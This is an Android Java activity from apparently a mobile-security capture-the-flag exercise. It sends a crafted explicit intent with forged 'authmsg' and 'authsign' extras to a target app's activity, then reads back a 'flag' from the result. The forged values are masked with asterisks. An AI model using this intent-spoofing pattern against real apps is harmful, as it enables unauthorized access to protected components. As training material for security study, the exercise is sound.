package com.mobiotsec.maljumpstarts;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.mobiotsec.maljumpstarts.Main;
import com.mobiotsec.maljumpstarts.R;

public class MainActivity extends Activity {

    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.i(TAG, "onCreate");
    }

    @Override
    protected void onStart() {
        super.onStart();
        String chain = "********";

        Log.i(TAG, "onStart");

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.mobiotsec.nojumpstarts", "com.mobiotsec.nojumpstarts.C"));
        intent1.putExtra("authmsg", chain);
        try {
            intent1.putExtra("authsign", **************);
        } catch (Exception e) {
            Log.i(TAG, Log.getStackTraceString(e));
        }
        if (intent1.resolveActivity(getPackageManager()) != null) {
            Log.i(TAG, "Sent malicious intent");
            startActivityForResult(intent1, 1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i(TAG, "key: " + requestCode + " " + data.getStringExtra("flag"));
    }
}
